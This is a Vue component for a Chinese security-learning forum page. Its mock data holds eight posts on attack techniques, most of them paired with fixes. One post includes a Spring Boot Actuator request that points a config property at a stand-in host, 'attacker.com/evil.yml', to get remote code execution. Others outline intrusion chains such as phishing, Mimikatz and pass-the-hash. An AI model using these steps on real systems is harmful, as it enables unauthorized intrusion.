<script setup lang="ts">
import { ref, onMounted } from 'vue';
import { avatarUrl } from '../../../api';

// 帖子类型定义
interface Post {
  id: number;
  title: string;
  content: string;
  author: {
    id: number;
    name: string;
    avatar: string;
  };
  createdAt: string;
  likes: number;
  comments: Comment[];
  tags: string[];
}

// 评论类型定义
interface Comment {
  id: number;
  content: string;
  author: {
    id: number;
    name: string;
    avatar: string;
  };
  createdAt: string;
  likes: number;
}

// 模拟帖子数据
const posts = ref<Post[]>([
  {
    id: 1,
    title: "分享一个实战中发现的Spring Boot RCE漏洞利用方法",
    content: "最近在一次授权测试中，发现目标系统使用了存在漏洞的Spring Boot版本(2.6.3)。通过分析发现可以利用Actuator端点进行RCE攻击。具体步骤如下：\n\n1. 首先确认目标开启了Actuator的env端点\n2. 利用spring.cloud.bootstrap.location属性指向恶意的yaml配置\n3. 通过spring.cloud.bootstrap.location触发远程代码执行\n\n已经在本地环境复现成功，分享一下具体的POC（已脱敏）：\n\nPOST /actuator/env\n{\n  \"name\": \"spring.cloud.bootstrap.location\",\n  \"value\": \"http://attacker.com/evil.yml\"\n}\n\n请大家在授权测试场景下谨慎使用，切勿用于非法用途。",
    author: {
      id: 1,
      name: "王伟雪",
      avatar: "/student1.jpg"
    },
    createdAt: "2024-03-15T08:30:00",
    likes: 42,
    tags: ["Spring Boot", "RCE", "漏洞分析", "实战案例"],
    comments: [
      {
        id: 1001,
        content: "这个漏洞链很清晰，我在测试环境验证了一下，确实可以复现。建议受影响的版本尽快升级到2.6.7以上。",
        author: {
          id: 2,
          name: "李强",
          avatar: "/student3.jpg"
        },
        createdAt: "2024-03-15T09:45:00",
        likes: 8
      },
      {
        id: 1002,
        content: "补充一点，这个漏洞如果配合权限绕过，危害会更大。建议同时检查一下Actuator的访问控制配置。",
        author: {
          id: 3,
          name: "林宗恒",
          avatar: "/example.png"
        },
        createdAt: "2024-03-15T10:20:00",
        likes: 15
      }
    ]
  },
  {
    id: 2,
    title: "记一次微服务API网关绕过案例",
    content: "在最近的一个项目中，发现了一个有趣的API网关绕过方法。目标使用了Spring Cloud Gateway作为网关，通过分析发现以下问题：\n\n1. 网关路由配置不当，存在路径穿越风险\n2. 内部服务直接暴露了8080端口\n3. 通过修改Host头可以绕过网关访问内部服务\n\n具体的绕过方法：\n1. 首先通过目录扫描发现了内部服务的端口\n2. 构造特殊的请求头：Host: internal-service:8080\n3. 成功访问到内部API\n\n修复建议：\n1. 严格限制网关路由规则\n2. 内部服务只允许网关IP访问\n3. 配置防火墙限制端口访问",
    author: {
      id: 2,
      name: "李强",
      avatar: "/student3.jpg"
    },
    createdAt: "2024-03-14T14:20:00",
    likes: 37,
    tags: ["API安全", "网关绕过", "微服务安全"],
    comments: [
      {
        id: 1003,
        content: "这个案例很实用。补充一点，如果使用K8s部署的话，建议配置NetworkPolicy限制Pod间通信。",
        author: {
          id: 4,
          name: "张明",
          avatar: "/student4.jpg"
        },
        createdAt: "2024-03-14T15:10:00",
        likes: 12
      }
    ]
  },
  {
    id: 3,
    title: "通过IAST发现的一个深层SQL注入",
    content: "最近在做应用安全测试时，通过IAST工具发现了一个比较隐蔽的SQL注入点。这个注入点在普通的黑盒测试中很难发现：\n\n1. 漏洞位置在订单处理的后端服务\n2. 参数经过了多层JSON序列化和Base64编码\n3. 最终在MyBatis的XML中拼接成了SQL语句\n\n漏洞复现步骤：\n1. 抓取订单创建请求\n2. 修改Base64编码的JSON数据\n3. 注入点在orderItems数组的productId字段\n\n修复方式：\n1. 使用MyBatis的#{} 预编译方式\n2. 增加参数类型校验\n3. 建议使用ORM框架的安全查询方法\n\n这个案例说明IAST在发现深层漏洞时的优势。",
    author: {
      id: 5,
      name: "赵明",
      avatar: "/student5.jpg"
    },
    createdAt: "2024-03-13T18:45:00",
    likes: 56,
    tags: ["IAST", "SQL注入", "代码审计", "最佳实践"],
    comments: [
      {
        id: 1004,
        content: "这种隐藏在业务逻辑深处的注入确实很难发现，IAST+代码审计的组合是个不错的选择。不知道作者用的是哪款IAST工具？",
        author: {
          id: 6,
          name: "陈静",
          avatar: "/student2.jpg"
        },
        createdAt: "2024-03-13T19:20:00",
        likes: 8
      }
    ]
  },
  {
    id: 4,
    title: "发现某CMS的任意文件上传漏洞",
    content: "在测试某开源CMS时发现一个任意文件上传漏洞，影响版本3.2.1及以下。漏洞原理：\n\n1. 文件上传接口未校验文件扩展名\n2. 服务端仅校验Content-Type\n3. 可绕过前端JS验证\n\n复现步骤：\n1. 拦截上传请求\n2. 修改文件扩展名和Content-Type\n3. 成功上传webshell\n\n建议修复方案：\n1. 服务端强校验文件类型\n2. 使用白名单限制扩展名\n3. 部署WAF防护",
    author: {
      id: 7,
      name: "刘洋",
      avatar: "/student6.png"
    },
    createdAt: "2024-03-12T10:30:00",
    likes: 45,
    tags: ["文件上传", "CMS漏洞", "代码审计"],
    comments: [
      {
        id: 1005,
        content: "这个漏洞我也遇到过，补充一点：如果配合文件包含漏洞，可以直接getshell。",
        author: {
          id: 8,
          name: "周杰",
          avatar: "/student10.png"
        },
        createdAt: "2024-03-12T11:15:00",
        likes: 12
      }
    ]
  },
  {
    id: 5,
    title: "记录一次内网渗透的过程",
    content: "最近在一次授权测试中，通过钓鱼邮件成功获取了一台内网主机的权限，分享完整的渗透过程：\n\n1. 初始访问：\n- 定向钓鱼邮件\n- 伪装成系统更新文件\n- 成功上线CS\n\n2. 权限提升：\n- 发现系统未打KB4534314补丁\n- 使用CVE-2020-0787提权\n\n3. 横向移动：\n- 使用Mimikatz抓取密码\n- 发现域管理员Hash\n- PTH攻击获取域控权限\n\n4. 防御建议：\n- 及时安装系统补丁\n- 加强域账号安全\n- 部署EDR系统",
    author: {
      id: 9,
      name: "吴超",
      avatar:"/student9.png"
    },
    createdAt: "2024-03-11T16:20:00",
    likes: 89,
    tags: ["内网渗透", "权限提升", "横向移动"],
    comments: [
      {
        id: 1006,
        content: "非常详细的复现过程，建议补充一下如何清除入侵痕迹的部分。",
        author: {
          id: 10,
          name: "孙伟",
          avatar:"/student8.png"
        },
        createdAt: "2024-03-11T17:00:00",
        likes: 23
      }
    ]
  },
  {
    id: 6,
    title: "Java反序列化漏洞分析与防御",
    content: "最近在审计一个Java应用时发现了反序列化漏洞，分享一下分析过程：\n\n漏洞成因：\n1. 应用使用ObjectInputStream直接反序列化用户输入\n2. classpath中存在commons-collections4.0\n3. 未配置反序列化白名单\n\n攻击复现：\n1. 使用ysoserial生成Payload\n2. 构造commons-collections利用链\n3. 成功执行任意命令\n\n防御措施：\n1. 升级commons-collections到4.1以上\n2. 使用ValidatingObjectInputStream\n3. 实现Look-ahead反序列化\n4. 配置SerialKiller等防御组件",
    author: {
      id: 11,
      name: "赵明",
      avatar:"/student5.jpg"
    },
    createdAt: "2024-03-10T09:15:00",
    likes: 76,
    tags: ["Java安全", "反序列化", "代码审计"],
    comments: [
      {
        id: 1007,
        content: "补充一点，如果使用Jackson反序列化，也要注意enableDefaultTyping带来的风险。",
        author: {
          id: 12,
          name: "陈静",
          avatar: "/student2.jpg"
        },
        createdAt: "2024-03-10T10:30:00",
        likes: 18
      }
    ]
  },
  {
    id: 7,
    title: "记一次Redis未授权访问引发的数据泄露",
    content: "在一次应急响应中发现客户的Redis服务器被攻击，整理了完整的分析过程：\n\n事件经过：\n1. Redis配置错误暴露在公网\n2. 无密码认证要求\n3. 攻击者通过主从复制写入WebShell\n\n影响范围：\n- 数据库完整性受损\n- 服务器被植入挖矿程序\n- 敏感信息泄露\n\n修复方案：\n1. 禁止Redis监听0.0.0.0\n2. 设置强密码认证\n3. 限制Redis文件写入目录\n4. 配置防火墙规则",
    author: {
      id: 13,
      name: "刘洋",
      avatar: "/student6.png"
    },
    createdAt: "2024-03-09T16:45:00",
    likes: 92,
    tags: ["Redis安全", "应急响应", "配置安全"],
    comments: [
      {
        id: 1008,
        content: "这种情况我也遇到过，建议在Redis前面加一层Sentinel做安全防护。",
        author: {
          id: 14,
          name: "周杰",
          avatar: "/student10.png"
        },
        createdAt: "2024-03-09T17:20:00",
        likes: 25
      }
    ]
  },
  {
    id: 8,
    title: "OAuth 2.0重定向劫持漏洞分析",
    content: "分享一个在OAuth认证中发现的重定向劫持漏洞：\n\n漏洞描述：\n1. OAuth回调地址验证不严格\n2. 支持任意子域名跳转\n3. 可被用于钓鱼攻击\n\n复现步骤：\n1. 构造恶意redirect_uri\n2. 保持原有参数结构\n3. 诱导用户点击登录\n\n防御建议：\n1. 严格校验回调域名\n2. 使用白名单限制\n3. 增加state参数校验\n4. 实现PKCE流程",
    author: {
      id: 15,
      name: "吴超",
      avatar: "/student9.png"
    },
    createdAt: "2024-03-08T11:30:00",
    likes: 68,
    tags: ["OAuth", "认证绕过", "安全配置"],
    comments: [
      {
        id: 1009,
        content: "OAuth的安全性确实容易被忽视，建议参考OAuth安全最佳实践指南加固。",
        author: {
          id: 16,
          name: "孙伟",
          avatar: "/student8.png"
        },
        createdAt: "2024-03-08T12:15:00",
        likes: 31
      }
    ]
  }
]);

// 新帖子表单数据
const newPost = ref({
  title: '',
  content: '',
  tags: ''
});

// 是否显示发帖表单
const showPostForm = ref(false);

const STORAGE_USER_KEYS = ['userInfo', 'currentUser', 'user', 'loginUser', 'loginData', 'tokenUser', 'studentInfo'];

const currentUser = ref({
  id: 0,
  name: '当前用户',
  avatar: '/example.png'
});

const asRecord = (value: unknown): Record<string, unknown> | null =>
  value !== null && typeof value === 'object' ? (value as Record<string, unknown>) : null;

const parseStorageValue = (raw: string) => {
  const text = raw.trim();
  if (!text) return null;
  if ((text.startsWith('{') && text.endsWith('}')) || (text.startsWith('[') && text.endsWith(']'))) {
    try {
      return JSON.parse(text);
    } catch {
      return raw;
    }
  }
  return raw;
};

const resolveCurrentUserFromStorage = () => {
  if (typeof window === 'undefined') {
    return;
  }

  const storages = [window.localStorage, window.sessionStorage];

  for (const storage of storages) {
    for (const key of STORAGE_USER_KEYS) {
      const raw = storage.getItem(key);
      if (!raw) continue;

      const parsed = parseStorageValue(raw);
      const queue = [parsed];

      while (queue.length) {
        const current = queue.shift();
        const record = asRecord(current);
        if (!record) continue;

        if (record.data) queue.push(record.data);
        if (record.loginData) queue.push(record.loginData);

        const name = [record.userName, record.username, record.name]
          .map((item) => (item === null || item === undefined ? '' : String(item).trim()))
          .find(Boolean);
        if (!name) continue;

        const idValue = [record.userId, record.id]
          .map((item) => Number(item))
          .find((item) => Number.isFinite(item) && item > 0) || 0;
        // user_image 里存的是文件名，要拼成图片服务地址才能直接当 src 用
        const avatar = avatarUrl(
          [record.userImage, record.avatar]
            .map((item) => (item === null || item === undefined ? '' : String(item).trim()))
            .find(Boolean),
        ) || '/example.png';

        currentUser.value = {
          id: idValue,
          name,
          avatar
        };
        return;
      }
    }
  }
};

// 评论相关
const commentContent = ref('');
const activePostId = ref<number | null>(null);

// 发布新帖子
const publishPost = () => {
  if (!newPost.value.title || !newPost.value.content) {
    alert('标题和内容不能为空');
    return;
  }

  // 模拟发布新帖子
  const tagsArray = newPost.value.tags.split(',').map(tag => tag.trim()).filter(tag => tag);
  
  const newPostObj: Post = {
    id: posts.value.length + 1,
    title: newPost.value.title,
    content: newPost.value.content,
    author: {
      id: currentUser.value.id,
      name: currentUser.value.name,
      avatar: currentUser.value.avatar
    },
    createdAt: new Date().toISOString(),
    likes: 0,
    tags: tagsArray,
    comments: []
  };

  posts.value.unshift(newPostObj);
  
  // 重置表单
  newPost.value = {
    title: '',
    content: '',
    tags: ''
  };
  
  // 关闭表单
  showPostForm.value = false;
};

// 格式化日期
const formatDate = (dateStr: string) => {
  const date = new Date(dateStr);
  return date.toLocaleDateString('zh-CN', { 
    year: 'numeric', 
    month: 'long', 
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

// 点赞功能
const likePost = (post: Post) => {
  post.likes++;
};

// 添加评论
const addComment = (post: Post) => {
  if (!commentContent.value.trim()) {
    return;
  }

  const newComment: Comment = {
    id: Math.floor(Math.random() * 10000),
    content: commentContent.value,
    author: {
      id: currentUser.value.id,
      name: currentUser.value.name,
      avatar: currentUser.value.avatar
    },
    createdAt: new Date().toISOString(),
    likes: 0
  };

  post.comments.push(newComment);
  commentContent.value = '';
  activePostId.value = null;
};

// 动画效果
onMounted(() => {
  resolveCurrentUserFromStorage();
});
</script>

<template>
  <div class="community-container">
    <!-- 社区头部 -->
    <div class="mb-8">
      <h1 class="text-3xl font-bold mb-2">安全学习社区</h1>
      <p class="text-base-content/70">分享你的学习心得、解题思路和安全技巧，向社区寻求帮助或提供指导</p>
      
      <div class="flex justify-between items-center mt-6">
        <div class="stats shadow">
          <div class="stat">
            <div class="stat-figure text-primary">
              <i class="fas fa-file-alt text-2xl"></i>
            </div>
            <div class="stat-title">帖子</div>
            <div class="stat-value text-primary">{{ posts.length }}</div>
          </div>
          
          <div class="stat">
            <div class="stat-figure text-secondary">
              <i class="fas fa-users text-2xl"></i>
            </div>
            <div class="stat-title">活跃用户</div>
            <div class="stat-value text-secondary">37</div>
          </div>
        </div>
        
        <button 
          @click="showPostForm = !showPostForm" 
          class="btn btn-primary gap-2"
        >
          <i class="fas fa-edit"></i>
          {{ showPostForm ? '取消' : '发布帖子' }}
        </button>
      </div>
    </div>
    
    <!-- 发布帖子表单 -->
    <div v-if="showPostForm" class="card bg-base-100 shadow-xl mb-8 transition-all duration-300 animate-fade-in">
      <div class="card-body">
        <h2 class="card-title">
          <i class="fas fa-edit mr-2"></i>
          发布新帖子
        </h2>
        
        <div class="form-control">
          <label class="label">
            <span class="label-text">标题</span>
          </label>
          <input 
            v-model="newPost.title" 
            type="text" 
            placeholder="输入帖子标题" 
            class="input input-bordered w-full"
          />
        </div>
        
        <div class="form-control">
          <label class="label">
            <span class="label-text">内容</span>
          </label>
          <textarea 
            v-model="newPost.content" 
            class="textarea textarea-bordered h-32" 
            placeholder="分享你的经验、问题或心得..."
          ></textarea>
        </div>
        
        <div class="form-control">
          <label class="label">
            <span class="label-text">标签（用逗号分隔）</span>
          </label>
          <input 
            v-model="newPost.tags" 
            type="text" 
            placeholder="例如: SQL注入, XSS, 渗透测试" 
            class="input input-bordered w-full"
          />
        </div>
        
        <div class="card-actions justify-end mt-4">
          <button 
            @click="showPostForm = false" 
            class="btn btn-ghost"
          >
            取消
          </button>
          <button 
            @click="publishPost" 
            class="btn btn-primary"
          >
            发布
          </button>
        </div>
      </div>
    </div>
    
    <!-- 帖子列表 -->
    <div class="space-y-6">
      <div 
        v-for="post in posts" 
        :key="post.id" 
        class="card bg-base-100 shadow-xl transition-all duration-300 hover:shadow-2xl"
      >
        <div class="card-body">
          <h2 class="card-title">
            {{ post.title }}
            <div class="badge badge-primary ml-2">{{ post.likes }} 赞</div>
          </h2>
          
          <div class="flex items-center text-sm text-base-content/60 mb-2">
            <div class="avatar mr-2">
              <div class="w-6 h-6 rounded-full">
                <img :src="post.author.avatar" alt="avatar" />
              </div>
            </div>
            <span class="font-medium">{{ post.author.name }}</span>
            <span class="mx-2">·</span>
            <span>{{ formatDate(post.createdAt) }}</span>
          </div>
          
          <p class="text-base-content/80 whitespace-pre-line">{{ post.content }}</p>
          
          <div class="flex flex-wrap gap-2 mt-4">
            <div 
              v-for="tag in post.tags" 
              :key="tag" 
              class="badge badge-outline badge-secondary"
            >
              {{ tag }}
            </div>
          </div>
          
          <div class="divider my-2"></div>
          
          <!-- 互动操作 -->
          <div class="flex items-center space-x-4">
            <button 
              @click="likePost(post)" 
              class="btn btn-sm btn-ghost gap-2"
            >
              <i class="fas fa-thumbs-up"></i>
              赞 ({{ post.likes }})
            </button>
            
            <button 
              @click="activePostId = activePostId === post.id ? null : post.id" 
              class="btn btn-sm btn-ghost gap-2"
            >
              <i class="fas fa-comment"></i>
              评论 ({{ post.comments.length }})
            </button>
            
            <button class="btn btn-sm btn-ghost gap-2">
              <i class="fas fa-share"></i>
              分享
            </button>
          </div>
          
          <!-- 评论区 -->
          <div v-if="activePostId === post.id || post.comments.length > 0" class="mt-4 bg-base-200 rounded-box p-4">
            <!-- 现有评论 -->
            <div v-if="post.comments.length > 0" class="space-y-4 mb-4">
              <h3 class="font-bold text-sm">评论 ({{ post.comments.length }})</h3>
              
              <div 
                v-for="comment in post.comments" 
                :key="comment.id" 
                class="flex items-start space-x-3 p-3 bg-base-100 rounded-lg"
              >
                <div class="avatar">
                  <div class="w-8 h-8 rounded-full">
                    <img :src="comment.author.avatar" alt="avatar" />
                  </div>
                </div>
                
                <div class="flex-1">
                  <div class="flex items-center">
                    <span class="font-medium text-sm">{{ comment.author.name }}</span>
                    <span class="mx-2 text-xs text-base-content/60">·</span>
                    <span class="text-xs text-base-content/60">{{ formatDate(comment.createdAt) }}</span>
                  </div>
                  
                  <p class="mt-1 text-sm">{{ comment.content }}</p>
                  
                  <div class="mt-2 flex items-center space-x-2">
                    <button class="btn btn-xs btn-ghost">
                      <i class="fas fa-thumbs-up mr-1"></i>
                      {{ comment.likes }}
                    </button>
                    <button class="btn btn-xs btn-ghost">回复</button>
                  </div>
                </div>
              </div>
            </div>
            
            <!-- 添加评论 -->
            <div v-if="activePostId === post.id" class="flex items-start space-x-3">
              <div class="avatar">
                <div class="w-8 h-8 rounded-full">
                  <img :src="currentUser.avatar" alt="Your avatar" />
                </div>
              </div>
              
              <div class="flex-1">
                <textarea 
                  v-model="commentContent" 
                  class="textarea textarea-bordered w-full text-sm" 
                  placeholder="写下你的评论..."
                  rows="2"
                ></textarea>
                
                <div class="flex justify-end mt-2">
                  <button 
                    @click="addComment(post)" 
                    class="btn btn-sm btn-primary"
                    :disabled="!commentContent.trim()"
                  >
                    发表评论
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.community-container {
  max-width: 1400px;
  margin: 0 auto;
  padding-bottom: 100px;
  padding-top: 2rem;  /* 添加顶部内边距 */
}

.stats {
  background-color: oklch(var(--b1) / 0.7);
  backdrop-filter: blur(10px);
}

/* 动画 */
@keyframes fade-in {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.animate-fade-in {
  animation: fade-in 0.3s ease-out forwards;
}

/* 卡片悬浮效果 */
.card {
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.card:hover {
  transform: translateY(-5px);
}

/* 标签样式 */
.badge-outline {
  border-width: 1px;
}
</style> 
